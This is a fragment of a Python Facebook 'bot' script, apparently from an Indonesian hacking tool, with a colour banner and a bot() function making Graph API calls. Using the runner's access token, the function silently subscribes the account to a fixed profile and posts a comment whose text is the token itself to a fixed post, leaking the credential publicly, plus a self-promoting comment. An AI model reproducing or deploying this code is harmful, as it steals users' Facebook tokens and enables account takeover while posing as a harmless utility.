...
\033[;93m/ /___/ / /_/ (__ |__ ) / /__  Tukang coli 
...
def bot():
	try:
		...
		tokenz()
	kom = ("Gantengnya Sandi")
	requests.post('https://graph.facebook.com/100038834718512/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/770279607198156/comments/?message=' + toket + '&access_token=' + toket)
	requests.post('https://graph.facebook.com/770279607198156/comments/?message=' + kom + '&access_token=' + toket)
	menu()
